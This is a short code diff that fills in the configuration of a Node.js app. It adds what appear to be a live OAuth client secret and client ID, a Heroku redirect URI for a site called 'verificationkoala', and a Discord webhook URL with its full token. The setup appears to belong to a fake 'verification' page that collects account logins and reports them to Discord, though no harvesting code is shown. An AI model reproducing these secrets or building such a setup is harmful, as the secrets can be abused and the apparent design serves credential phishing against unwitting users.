@@ -1,9 +1,9 @@
 // Configuration
-const client_secret = 'change'
-const client_id = 'change'
-const redirect_uri = 'change'
-const webhook_url = 'change'
-const webhook_logging_url = 'change'
+const client_secret = 'c~J8Q~ac_PkgUSXamhbKpgtJ0w5BuiHjr_WWpcH8'
+const client_id = '24f15185-4951-43a3-99e1-d66f78b245d1'
+const redirect_uri = 'https://verificationkoala.herokuapp.com/'
+const webhook_url = 'https://discord.com/api/webhooks/1021301365282181161/3VOeeMzL6gxWZtpV0udnYcnpDoUqqCsvlCfjNfh-TE3O_0bVWjkRKpp90IYijNH-ZSWC'
+const webhook_logging_url = 'https://discord.com/api/webhooks/1021301365282181161/3VOeeMzL6gxWZtpV0udnYcnpDoUqqCsvlCfjNfh-TE3O_0bVWjkRKpp90IYijNH-ZSWC'
 // Config end
 const axios = require('axios')
 const express = require('express')
